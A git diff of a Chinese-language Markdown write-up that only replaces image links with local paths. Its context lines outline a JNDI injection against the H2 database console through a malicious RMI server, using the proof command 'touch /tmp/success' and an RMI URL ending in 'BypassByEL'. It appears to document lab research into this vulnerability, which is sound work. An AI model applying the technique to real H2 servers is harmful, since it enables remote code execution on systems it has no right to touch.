@@ -57,11 +57,11 @@ public class EvilRMIServerNew {
 
 首先设置JNDI工具中执行的命令为`touch /tmp/success`：
 
-![image-20220223235645410](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202232356618.png)
+![image-20220223235645410](./images/202202232356618.png)
 
 然后启动`JNDI-1.0-all.jar`，在h2 console页面填入JNDI类名和URL地址：
 
-![image-20220224001157803](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202240011878.png)
+![image-20220224001157803](./images/202202240011878.png)
 
 Driver Class（JNDI的工厂类）：
 
@@ -77,9 +77,9 @@ rmi://192.168.128.1:23456/BypassByEL
 
 点击连接后，恶意RMI成功接收到请求：
 
-![image-20220224001238367](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202240012570.png)
+![image-20220224001238367](./images/202202240012570.png)
 
 `touch /tmp/success`已成功执行：
 
-![image-20220224001248279](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202240012334.png)
+![image-20220224001248279](./images/202202240012334.png)
 
